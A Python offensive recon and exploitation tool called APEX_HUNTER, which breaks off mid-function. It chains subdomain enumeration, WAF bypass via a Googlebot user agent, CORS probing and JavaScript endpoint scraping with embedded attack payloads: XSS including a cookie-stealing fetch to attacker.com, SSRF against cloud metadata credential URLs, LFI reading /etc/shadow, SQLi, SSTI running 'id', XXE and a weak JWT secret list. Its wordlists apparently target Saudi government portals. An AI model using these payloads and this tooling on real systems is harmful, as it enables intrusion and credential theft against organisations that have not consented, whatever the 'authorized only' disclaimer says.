#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
APEX_HUNTER v1.0 — Advanced Professional Exploitation & Recon Hunter
═════════════════════════════════════════════════════════════════════
35 Integrated Tools | 45 Security Skills | Full Auto-Chain Execution

Merges: TITAN_HUNTER v1.0 + Advanced_Recon v2.0 + REDTEAM.PY v3.0
New:    15 Advanced Techniques

Usage:
  python APEX_HUNTER.py --target https://example.com --output ./out
  python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3
  python APEX_HUNTER.py --skills
  python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0

Authorized bug-bounty / legal security research ONLY.
"""
from __future__ import annotations
import argparse, asyncio, base64, binascii, calendar, csv, hashlib
import html, ipaddress, json, math, os, re, socket, ssl, string
import struct, sys, time, urllib.error, urllib.parse, urllib.request
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs

try:
    import aiohttp; HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import requests; HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Console colors ────────────────────────────────────────────
class C:
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; BLUE='\033[0;34m'; PURPLE='\033[0;35m'
    WHITE='\033[1;37m'; DIM='\033[2m'; BOLD='\033[1m'; NC='\033[0m'

def banner(m): print(f"\n{C.CYAN}[*] {m}{C.NC}")
def ok(m):     print(f"{C.GREEN}[+] {m}{C.NC}")
def warn(m):   print(f"{C.YELLOW}[!] {m}{C.NC}")
def high(m):   print(f"{C.RED}[!!] {m}{C.NC}")
def info(m):   print(f"{C.DIM}    {m}{C.NC}")
def skill(m):  print(f"{C.PURPLE}[SKILL] {m}{C.NC}")

# ══════════════════════════════════════════════════════════════
# EMBEDDED PAYLOADS & WORDLISTS
# ══════════════════════════════════════════════════════════════
PAYLOADS_XSS = [
    "<script>alert(1)</script>", '"><script>alert(1)</script>',
    "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>",
    "<svg><animate onbegin=alert(1)>", "<details open ontoggle=alert(1)>",
    "javascript:alert(1)", "javascript:alert(document.cookie)",
    '" onmouseover="alert(1)', "' onfocus='alert(1)",
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "</title><script>alert(1)</script>", "</textarea><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
    "مرحبا<script>alert(1)</script>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
]

PAYLOADS_SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/",
    "http://[::1]/", "http://127.1/", "http://2130706433/",
    "http://169.254.169.254/openstack/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1:9200/", "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/", "http://127.0.0.1:5432/",
]

PAYLOADS_LFI = [
    "../../../../etc/passwd", "../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../etc/shadow", "../../../../proc/self/environ",
    "../../../../proc/self/cmdline", "/etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "../../../../windows/system32/drivers/etc/hosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

PAYLOADS_SQLI = [
    "'", '"', "''", '``', "' OR '1'='1", "' OR '1'='1'--",
    '" OR "1"="1', "1 AND 1=1", "1 AND 1=2",
    "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "' AND SLEEP(0)--", "; WAITFOR DELAY '0:0:0'--",
    '{"$gt": ""}', '{"$ne": null}',
]

PAYLOADS_SSTI = [
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{7*'7'}}", "{{'7'*7}}", "{% for i in range(7) %}{{i}}{% endfor %}",
    "{{config}}", "{{self}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${{7*7}}", "{#{7*7}}", "{{1+1}}", "@(7*7)",
]

PAYLOADS_XXE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

PAYLOADS_PROTO_POLLUTION = [
    '{"__proto__":{"polluted":"APEX_HUNTER"}}',
    '{"constructor":{"prototype":{"polluted":"APEX_HUNTER"}}}',
    '{"__proto__.polluted":"APEX_HUNTER"}',
]

WORDLIST_SUBDOMAINS = [
    "www","api","dev","staging","uat","test","beta","alpha","prod","demo",
    "sandbox","qa","auth","login","sso","oauth","admin","portal","console",
    "dashboard","app","mobile","m","web","help","support","mail","smtp",
    "ftp","sftp","cdn","static","assets","media","upload","git","jenkins",
    "ci","monitor","grafana","kibana","elastic","vpn","remote","internal",
    "intranet","db","database","cache","redis","backup","eservices","eportal",
    "citizen","national","nafath","absher","tamm","book","booking","flight",
    "checkin","reservation","loyalty","cargo","b2b","agent","v1","v2","v3",
    "api2","api3","api-v1","api-v2","services","gateway","integration","ws",
    "webhook","secure","vault","config","preprod","preview","hotfix","old","new",
    "ar","en","ksa","sa","app1","app2","test1","test2","dev1","dev2",
]

WORDLIST_API_PATHS = [
    "/api","/api/v1","/api/v2","/api/v3","/rest","/rest/v1","/v1","/v2","/v3",
    "/graphql","/graphiql","/playground","/gql","/query",
    "/api/auth","/api/login","/api/logout","/api/register","/api/token",
    "/api/refresh","/api/reset-password","/api/oauth","/oauth/token",
    "/oauth/authorize","/.well-known/openid-configuration",
    "/api/user","/api/users","/api/me","/api/profile","/api/account",
    "/api/session","/api/search","/api/tickets","/api/ticket",
    "/api/requests","/api/orders","/api/order","/api/bookings","/api/booking",
    "/api/flights","/api/pnr","/api/checkin","/api/config","/api/settings",
    "/api/health","/api/status","/api/ping","/api/version","/api/info",
    "/api/admin","/api/debug","/api/webhooks","/api/notifications",
    "/api/payments","/api/invoices","/api/reports","/api/export",
    "/swagger","/swagger.json","/swagger-ui","/swagger-ui.html",
    "/openapi.json","/openapi.yaml","/api-docs","/redoc",
    "/actuator","/actuator/health","/actuator/env","/actuator/info",
    "/actuator/metrics","/actuator/beans","/actuator/heapdump",
    "/.env","/.git/HEAD","/.git/config","/config.json","/package.json",
    "/robots.txt","/sitemap.xml","/.well-known/security.txt",
    "/server-status","/phpinfo.php","/admin","/administrator",
    "/wp-admin","/wp-login.php","/phpmyadmin",
    "/api/v1/users","/api/v1/auth","/api/v2/users","/api/v2/tickets",
    "/hc/api/v2/requests","/hc/requests",
    "/api/graphql","/v1/graphql","/api/graph",
]

WORDLIST_JWT_SECRETS = [
    "secret","password","123456","secret123","jwt_secret","supersecret",
    "mysecret","changeme","letmein","qwerty","abc123","test","admin",
    "key","private","token","authsecret","jwtsecret","app_secret",
]

# ══════════════════════════════════════════════════════════════
# DATACLASSES
# ══════════════════════════════════════════════════════════════
@dataclass
class Finding:
    id: str; title: str; severity: str; cwe: str; cvss: float
    description: str; evidence: str; reproduction: str; poc_curl: str
    burp_request: str = ""; category: str = ""; remediation: str = ""

@dataclass
class TargetProfile:
    url: str; apex: str; host: str; scheme: str
    ip: str = ""; asn: str = ""; provider: str = ""
    tls_version: str = ""; tls_cipher: str = ""
    cert_cn: str = ""; cert_sans: List[str] = field(default_factory=list)
    cert_issuer: str = ""; cert_expires: str = ""
    waf: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    ct_subdomains: List[str] = field(default_factory=list)
    wayback_urls: List[str] = field(default_factory=list)
    js_files: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    graphql_endpoints: List[str] = field(default_factory=list)
    sensitive_paths: List[str] = field(default_factory=list)
    s3_buckets: List[str] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    security_headers: Dict[str, Any] = field(default_factory=dict)
    cors_results: List[Dict] = field(default_factory=list)
    cookie_results: List[Dict] = field(default_factory=list)
    secrets: List[Dict] = field(default_factory=list)
    open_redirects: List[str] = field(default_factory=list)
    ssrf_params: List[str] = field(default_factory=list)
    parameters: List[str] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)
    jwt_tokens: List[Dict] = field(default_factory=list)
    oauth_endpoints: List[str] = field(default_factory=list)
    websocket_endpoints: List[str] = field(default_factory=list)
    ssti_params: List[str] = field(default_factory=list)
    smuggling_results: List[Dict] = field(default_factory=list)

@dataclass
class Config:
    targets: List[str]
    output: str
    workers: int = 10; rate: float = 2.0; depth: int = 3; timeout: int = 20
    scope_extras: List[str] = field(default_factory=list)
    phases: List[int] = field(default_factory=lambda: list(range(1, 8)))
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ua_bot: str = "Googlebot/2.1 (+http://www.google.com/bot.html)"

# ══════════════════════════════════════════════════════════════
# HTTP HELPERS
# ══════════════════════════════════════════════════════════════
def _ssl_ctx():
    ctx = ssl._create_unverified_context()
    ctx.check_hostname = False
    return ctx

def _fetch(url: str, ua: str, timeout: int, method: str = "GET",
           data: bytes = None, headers_extra: Dict = None,
           return_headers: bool = False) -> Tuple[int, str, Dict]:
    try:
        h = {"User-Agent": ua, "Accept": "text/html,application/json,*/*",
             "Accept-Language": "ar,en-US;q=0.7,en;q=0.3"}
        if headers_extra:
            h.update(headers_extra)
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            body = r.read(2_000_000).decode("utf-8", errors="replace")
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            return r.status, body, hdrs
    except urllib.error.HTTPError as e:
        try:
            body = e.read(5000).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        hdrs = {k.lower(): v for k, v in e.headers.items()}
        return e.code, body, hdrs
    except Exception:
        return 0, "", {}

def _head(url: str, ua: str, timeout: int, headers_extra: Dict = None) -> Tuple[int, Dict]:
    code, _, hdrs = _fetch(url, ua, timeout, method="HEAD", headers_extra=headers_extra)
    if code == 0:  # some servers don't support HEAD
        code, _, hdrs = _fetch(url, ua, timeout, headers_extra=headers_extra)
    return code, hdrs

# ══════════════════════════════════════════════════════════════
# TOOL 1: DNS RESOLVER  (SKILL-01, SKILL-22, SKILL-23)
# ══════════════════════════════════════════════════════════════
class DNSResolver:
    ASN_RANGES = [
        ("104.16.0.0/12","Cloudflare (AS13335)"),("172.64.0.0/13","Cloudflare (AS13335)"),
        ("20.0.0.0/8","Microsoft Azure (AS8075)"),("13.0.0.0/8","Microsoft Azure (AS8075)"),
        ("52.0.0.0/8","Amazon AWS (AS16509)"),("54.0.0.0/8","Amazon AWS (AS16509)"),
        ("185.169.0.0/16","ZAIN/STC Saudi Arabia"),("164.215.0.0/16","Saudi Gov Network (MCIT)"),
        ("192.168.0.0/16","RFC1918 Private"),("10.0.0.0/8","RFC1918 Private"),
    ]

    def resolve(self, h: str) -> str:
        try: return socket.gethostbyname(h)
        except: return "NXDOMAIN"

    def classify(self, ip: str) -> str:
        try:
            a = ipaddress.ip_address(ip)
            for cidr, name in self.ASN_RANGES:
                if a in ipaddress.ip_network(cidr, strict=False): return name
        except: pass
        return "Unknown"

    def wildcard_check(self, apex: str) -> bool:
        rand = f"notexist-{int(time.time())}-xyzabc.{apex}"
        return self.resolve(rand) != "NXDOMAIN"

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("DNS-01: Resolving target + ASN + wildcard check")
        h = profile.host; apex = profile.apex
        ip = self.resolve(h)
        profile.ip = ip
        profile.provider = self.classify(ip)
        ok(f"  {h} → {ip} ({profile.provider})")
        live = []
        for sub in WORDLIST_SUBDOMAINS[:40]:
            fqdn = f"{sub}.{apex}"
            r = self.resolve(fqdn)
            if r != "NXDOMAIN":
                live.append(fqdn); info(f"  {fqdn} → {r}")
        profile.subdomains = live
        if self.wildcard_check(apex):
            warn(f"  WILDCARD DNS on {apex} — filter subdomain results!")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 2: TLS ANALYZER  (SKILL-02, SKILL-25)
# ══════════════════════════════════════════════════════════════
class TLSAnalyzer:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("TLS-02: Cipher, version, cert, SAN, ACME detection")
        try:
            ctx = _ssl_ctx()
            with socket.create_connection((profile.host, 443), timeout=10) as s:
                with ctx.wrap_socket(s, server_hostname=profile.host) as ss:
                    profile.tls_version = ss.version() or ""
                    profile.tls_cipher  = ss.cipher()[0] if ss.cipher() else ""
                    cert = ss.getpeercert()
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", []))
                        issr = dict(x[0] for x in cert.get("issuer", []))
                        profile.cert_cn     = subj.get("commonName", "")
                        profile.cert_issuer = issr.get("organizationName", "")
                        profile.cert_expires= cert.get("notAfter", "")
                        profile.cert_sans   = [v for k,v in cert.get("subjectAltName",[])]
            ok(f"  {profile.tls_version} / {profile.tls_cipher}")
            ok(f"  CN={profile.cert_cn} expires={profile.cert_expires}")
            # Short-lived cert detection
            if profile.cert_expires:
                from email.utils import parsedate
                t = parsedate(profile.cert_expires)
                if t:
                    days = (calendar.timegm(t) - time.time()) / 86400
                    if days < 45:
                        warn(f"  Short-lived cert ({int(days)}d) — ACME/Let's Encrypt rotation")
        except Exception as e:
            warn(f"  TLS probe: {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 3: CT LOG SCANNER  (SKILL-03)
# ══════════════════════════════════════════════════════════════
class CTLogScanner:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("CT-03: Certificate Transparency log mining (crt.sh)")
        try:
            url = f"https://crt.sh/?q=%25.{profile.apex}&output=json"
            req = urllib.request.Request(url, headers={"User-Agent": "APEX/1.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read().decode())
            seen = set()
            for row in data:
                for n in str(row.get("name_value","")).splitlines():
                    n = n.strip().lstrip("*.").lower()
                    if n and "@" not in n and " " not in n and n.endswith(profile.apex):
                        seen.add(n)
            profile.ct_subdomains = sorted(seen)
            ok(f"  {len(profile.ct_subdomains)} subdomains in CT logs")
            for s in profile.ct_subdomains[:10]: info(f"  {s}")
        except Exception as e:
            warn(f"  CT log query failed (run locally): {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 4: WAYBACK MINER  (SKILL-04)
# ══════════════════════════════════════════════════════════════
class WaybackMiner:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("WAYBACK-04: Mining archived URLs + parameter extraction")
        try:
            url = (f"https://web.archive.org/cdx/search/cdx"
                   f"?url=*.{profile.apex}/*&output=json&fl=original"
                   f"&collapse=urlkey&limit=3000")
            req = urllib.request.Request(url, headers={"User-Agent": "APEX/1.0"})
            with urllib.request.urlopen(req, timeout=20) as r:
                rows = json.loads(r.read().decode())
            urls = set()
            for row in (rows[1:] if rows and isinstance(rows[0], list) else rows):
                if isinstance(row, list) and row: urls.add(row[0])
                elif isinstance(row, str): urls.add(row)
            profile.wayback_urls = sorted(urls)
            ok(f"  {len(profile.wayback_urls)} archived URLs")
            interesting = [u for u in profile.wayback_urls if re.search(
                r'\.(json|xml|csv|bak|sql|env|key|pem)|api/|admin/|config|token=|password=', u, re.I)]
            if interesting:
                warn(f"  {len(interesting)} interesting archived URLs")
                for u in interesting[:5]: info(f"  {u}")
        except Exception as e:
            warn(f"  Wayback failed (run locally): {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 5: WAF DETECTOR  (SKILL-05, SKILL-24)
# ══════════════════════════════════════════════════════════════
class WAFDetector:
    WAF_HEADERS = {
        "Cloudflare":    ["cf-ray","cf-cache-status","cf-request-id"],
        "Akamai":        ["x-akamai-transformed","x-akamai-request-id"],
        "AWS CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
        "Fastly":        ["x-fastly-request-id","x-served-by","x-timer"],
        "Varnish":       ["x-varnish"],
        "Incapsula":     ["x-iinfo","x-cdn"],
        "Sucuri":        ["x-sucuri-id","x-sucuri-cache"],
        "DataDome":      ["x-datadome-cid"],
        "Reblaze":       ["x-reblaze-protection"],
        "F5 BIG-IP":     ["x-wa-info"],
        "Imperva":       ["x-iinfo"],
        "PerimeterX":    ["_pxhd","x-px-"],
        "AWS WAF":       ["x-amzn-requestid","x-amzn-trace-id"],
        "ModSecurity":   ["x-modsecurity"],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WAF-05: WAF/CDN fingerprinting + Googlebot bypass")
        code, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        detected = []
        for waf, h_list in self.WAF_HEADERS.items():
            for h in h_list:
                if h in hdrs and waf not in detected:
                    detected.append(waf)
                    ok(f"  WAF: {waf} (via {h}: {hdrs[h][:50]})")
        server = hdrs.get("server","")
        if server: info(f"  Server: {server}")
        # Googlebot bypass
        bot_code, _, _ = _fetch(profile.url, cfg.ua_bot, cfg.timeout)
        if code not in (0,200) and bot_code == 200:
            high(f"  WAF BYPASS: Googlebot UA returns 200 vs browser {code}!")
            profile.findings.append(Finding(
                id=f"F-WAF-001", title="WAF Bypass via Googlebot UA",
                severity="MEDIUM", cwe="CWE-693", cvss=5.3,
                description="WAF bypassed using Googlebot user-agent string.",
                evidence=f"Browser: {code} | Googlebot: {bot_code}",
                reproduction=f"curl -A '{cfg.ua_bot}' '{profile.url}'",
                poc_curl=f"curl -sk -A '{cfg.ua_bot}' '{profile.url}'",
                category="WAF Bypass",
                remediation="Block bot impersonation in WAF rules."
            ))
            detected.append("BYPASS:Googlebot")
        profile.waf = detected
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 6: TECHNOLOGY FINGERPRINTER  (SKILL-06)
# ══════════════════════════════════════════════════════════════
class TechFingerprinter:
    SIGS = {
        "React":r"__reactFiber|data-reactroot|react\.development|ReactDOM",
        "Vue.js":r"__vue__|v-bind:|vue\.runtime|__VUE__",
        "Angular":r"ng-version|_nghost|angular\.min|ng-app",
        "Next.js":r"__NEXT_DATA__|/_next/static",
        "Nuxt.js":r"__nuxt|_nuxt/|__NUXT__",
        "WordPress":r"wp-content|wp-includes|wp-json",
        "Drupal":r"Drupal\.settings|drupal\.js|/sites/default/files",
        "Joomla":r"joomla|option=com_",
        "SharePoint":r"_layouts/|_vti_bin|SharePoint",
        "jQuery":r"jquery\.min\.js|jQuery\.fn|jquery-\d+",
        "Bootstrap":r"bootstrap\.min\.css|bootstrap\.bundle",
        "PHP":r"\.php\b|PHPSESSID",
        "ASP.NET":r"__VIEWSTATE|asp\.net|\.aspx\b|X-AspNet-Version",
        "Zendesk":r"zendesk\.com|zdassets\.com|zopim",
        "Freshdesk":r"freshdesk\.com|freshwidget",
        "Salesforce":r"salesforce\.com|force\.com|\.lightning\.",
        "Google Analytics":r"google-analytics\.com|gtag\(",
        "GTM":r"googletagmanager\.com|GTM-[A-Z0-9]+",
        "CloudFront":r"cloudfront\.net|x-amz-cf",
        "Amazon S3":r"s3\.amazonaws\.com|s3-[a-z]+-[0-9]+\.amazonaws",
        "Nginx":r"nginx/|Server: nginx",
        "Apache":r"Apache/|Server: Apache",
        "IIS":r"Microsoft-IIS|X-Powered-By: ASP",
        "Node.js":r"X-Powered-By: Express|node\.js",
        "Django":r"csrfmiddlewaretoken|django",
        "Laravel":r"laravel_session|XSRF-TOKEN",
        "Spring":r"JSESSIONID|spring|\.do\b",
        "Ruby on Rails":r"_session_id|rails",
        "GraphQL":r"graphql|__schema|__typename",
        "Swagger":r"swagger-ui|openapi|api-docs",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TECH-06: Technology stack fingerprinting (30 signatures)")
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        combined = body + "\n" + "\n".join(f"{k}: {v}" for k,v in hdrs.items())
        detected = []
        for tech, pat in self.SIGS.items():
            if re.search(pat, combined, re.I):
                detected.append(tech); ok(f"  Technology: {tech}")
        for k, v in hdrs.items():
            if re.search(r"x-powered-by|x-generator|x-aspnet|x-drupal", k, re.I):
                ok(f"  Header disclosure: {k}: {v}")
        profile.technologies = detected
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 7: SECURITY HEADER AUDITOR  (SKILL-07)
# ══════════════════════════════════════════════════════════════
class SecurityHeaderAuditor:
    CHECKS = {
        "strict-transport-security":      (20, lambda v: "max-age" in v.lower()),
        "content-security-policy":        (20, lambda v: bool(v)),
        "x-content-type-options":         (10, lambda v: "nosniff" in v.lower()),
        "x-frame-options":                (10, lambda v: v.upper() in ["DENY","SAMEORIGIN"]),
        "referrer-policy":                ( 5, lambda v: bool(v)),
        "permissions-policy":             ( 5, lambda v: bool(v)),
        "x-xss-protection":               ( 5, lambda v: "1" in v),
        "cache-control":                  ( 5, lambda v: "no-store" in v.lower()),
        "cross-origin-opener-policy":     (10, lambda v: bool(v)),
        "cross-origin-resource-policy":   (10, lambda v: bool(v)),
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HEADERS-07: Security header audit & scoring")
        _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        score = 0; results = {}
        for h, (w, check) in self.CHECKS.items():
            val = hdrs.get(h, "")
            ok_ = check(val) if val else False
            if ok_: score += w; st = "PASS"
            elif val: score += w//2; st = "WEAK"
            else: st = "MISSING"
            results[h] = {"status": st, "value": val}
            col = C.GREEN if st=="PASS" else (C.YELLOW if st=="WEAK" else C.RED)
            print(f"  {col}[{st:7s}]{C.NC} {h}: {val[:55] or '(not set)'}")
        profile.security_headers = {"score": score, "max": 100, "headers": results}
        ok(f"  Score: {score}/100")
        if score < 40:
            profile.findings.append(Finding(
                id="F-HDR-001", title="Critical Security Headers Missing",
                severity="HIGH" if score < 20 else "MEDIUM", cwe="CWE-693", cvss=5.4,
                description=f"Header score {score}/100 — multiple critical headers absent.",
                evidence=json.dumps({k:v["status"] for k,v in results.items()},indent=2),
                reproduction=f"curl -sI '{profile.url}'",
                poc_curl=f"curl -sI '{profile.url}'",
                category="Security Headers",
                remediation="Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 8: CSP ANALYZER  (SKILL-08)
# ══════════════════════════════════════════════════════════════
class CSPAnalyzer:
    WEAKNESSES = [
        (r"script-src[^;]*'unsafe-inline'","HIGH","unsafe-inline allows XSS"),
        (r"script-src[^;]*'unsafe-eval'","HIGH","unsafe-eval allows code injection"),
        (r"script-src\s+\*|default-src\s+\*","HIGH","Wildcard source — any origin"),
        (r"script-src[^;]*data:","MEDIUM","data: URI in script-src"),
        (r"script-src[^;]*http:","MEDIUM","Plain HTTP source in CSP"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CSP-08: Content Security Policy weakness analysis")
        csp = (profile.security_headers.get("headers",{})
               .get("content-security-policy",{}).get("value",""))
        if not csp:
            warn("  No CSP — XSS fully unmitigated"); return profile
        for pat, sev, desc in self.WEAKNESSES:
            if re.search(pat, csp, re.I):
                col = C.RED if sev == "HIGH" else C.YELLOW
                print(f"  {col}[CSP-{sev}]{C.NC} {desc}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 9: CORS ANALYZER  (SKILL-09)
# ══════════════════════════════════════════════════════════════
class CORSAnalyzer:
    ORIGINS = [
        ("REFLECTED", "{host}"),
        ("NULL",      "null"),
        ("EVIL_SUB",  "evil.{apex}"),
        ("APEX_SFX",  "{apex}.evil.com"),
        ("ATTACKER",  "attacker.{apex}"),
        ("HTTP_DOWN", "http://{host}"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CORS-09: CORS misconfiguration (6 bypass patterns)")
        host = profile.host; apex = profile.apex
        vulns = []
        for label, tpl in self.ORIGINS:
            origin = tpl.replace("{host}", host).replace("{apex}", apex)
            _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                                headers_extra={"Origin": origin,
                                "Access-Control-Request-Method": "GET"})
            acao = hdrs.get("access-control-allow-origin","")
            acac = hdrs.get("access-control-allow-credentials","").lower()
            profile.cors_results.append({"label":label,"origin":origin,"acao":acao,"acac":acac})
            if acao and (acao == origin or acao == "*"):
                lv = "CRITICAL" if (acao==origin and acac=="true") else "HIGH"
                high(f"  CORS [{label}]: ACAO={acao} ACAC={acac}")
                vulns.append({"origin":origin,"label":label,"acao":acao,"acac":acac,"level":lv})
        if vulns:
            w = max(vulns, key=lambda x:{"CRITICAL":4,"HIGH":3,"MEDIUM":2}.get(x["level"],0))
            profile.findings.append(Finding(
                id="F-CORS-001", title="CORS Misconfiguration",
                severity=w["level"], cwe="CWE-942",
                cvss=8.1 if w["level"]=="CRITICAL" else 6.5,
                description=f"{len(vulns)} CORS bypass patterns confirmed.",
                evidence="\n".join(f"{v['label']}: {v['acao']} creds={v['acac']}" for v in vulns),
                reproduction=f"curl -H 'Origin: {w['origin']}' -I '{profile.url}'",
                poc_curl=f"curl -sk -H 'Origin: {w['origin']}' -I '{profile.url}'",
                burp_request=f"GET / HTTP/1.1\nHost: {host}\nOrigin: {w['origin']}\n",
                category="CORS",
                remediation="Implement an explicit allowlist. Never reflect Origin header directly."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 10: COOKIE AUDITOR  (SKILL-10)
# ══════════════════════════════════════════════════════════════
class CookieAuditor:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("COOKIE-10: Cookie security attribute audit")
        import http.cookiejar
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cj),
            urllib.request.HTTPSHandler(context=_ssl_ctx()))
        try:
            opener.open(urllib.request.Request(
                profile.url, headers={"User-Agent": cfg.user_agent}), timeout=cfg.timeout)
        except Exception: pass
        issues = []
        for c in cj:
            ci = []
            if not c.secure: ci.append("missing Secure")
            if not c.has_nonstandard_attr("HttpOnly"): ci.append("missing HttpOnly")
            if not c.has_nonstandard_attr("SameSite"): ci.append("missing SameSite")
            profile.cookie_results.append({"name":c.name,"issues":ci})
            if ci:
                warn(f"  Cookie '{c.name}': {', '.join(ci)}")
                issues.append(c.name)
        if issues:
            profile.findings.append(Finding(
                id="F-CK-001", title="Insecure Cookie Configuration",
                severity="MEDIUM", cwe="CWE-1004", cvss=4.7,
                description=f"Cookies {issues} lack security attributes.",
                evidence=str(issues),
                reproduction=f"curl -sc /dev/null -I '{profile.url}'",
                poc_curl=f"curl -sc /dev/null -I '{profile.url}'",
                category="Cookie Security",
                remediation="Set Secure; HttpOnly; SameSite=Strict on all session cookies."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 11: JS EXTRACTOR  (SKILL-11)
# ══════════════════════════════════════════════════════════════
class JSExtractor:
    EP_PATTERNS = [
        r'(?:fetch|axios\.(?:get|post|put|delete))\s*\(\s*["\']([^"\']+)["\']',
        r'(?:url|endpoint|baseURL|API_URL|apiUrl)\s*[=:]\s*["\']([^"\']+)["\']',
        r'(?:\/api\/|\/v\d+\/|\/rest\/)[^\s"\'<>{}]+',
        r'XMLHttpRequest.*?open\s*\(\s*["\'][A-Z]+["\'],\s*["\']([^"\']+)["\']',
    ]

    def _js_urls(self, html_body: str, base: str) -> List[str]:
        refs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html_body, re.I)
        out = []
        for r in refs:
            if r.startswith("http"): out.append(r)
            elif r.startswith("//"): out.append("https:" + r)
            elif r.startswith("/"): 
                p = urlparse(base)
                out.append(f"{p.scheme}://{p.netloc}{r}")
            else: out.append(urljoin(base, r))
        return list(set(out))[:30]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JS-11: JavaScript file discovery + endpoint extraction")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        js_files = self._js_urls(html_body, profile.url)
        profile.js_files = js_files
        ok(f"  Found {len(js_files)} JS files")
        eps = set(); params = set()
        for jf in js_files[:15]:
            _, content, _ = _fetch(jf, cfg.user_agent, cfg.timeout)
            if not content: continue
            for pat in self.EP_PATTERNS:
                for m in re.findall(pat, content, re.I):
                    if len(m) > 3: eps.add(m)
            for m in re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', content):
                if len(m) > 2: params.add(m)
            # Detect JWT tokens in JS
            for m in re.findall(r'eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+', content):
                try:
